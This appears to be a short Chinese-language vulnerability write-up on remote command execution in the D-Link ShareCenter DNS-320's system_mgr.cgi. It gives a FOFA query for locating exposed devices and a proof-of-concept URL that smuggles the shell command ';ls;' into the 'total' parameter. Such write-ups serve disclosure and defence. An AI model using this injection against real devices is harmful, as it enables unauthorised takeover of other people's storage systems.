---
title: D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - D-Link
---

# D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞

## 漏洞描述

D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 漏洞影响

> [!NOTE]
>
> D-Link ShareCenter DNS-320

## FOFA

> [!NOTE]
>
> app="D_Link-DNS-ShareCenter"

## 漏洞复现

登录页面如下

![image-20210605180903289](/img/20210924020304144097.png)

漏洞POC为

```
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

![image-20210605181224009](/img/20210924020304512412.png)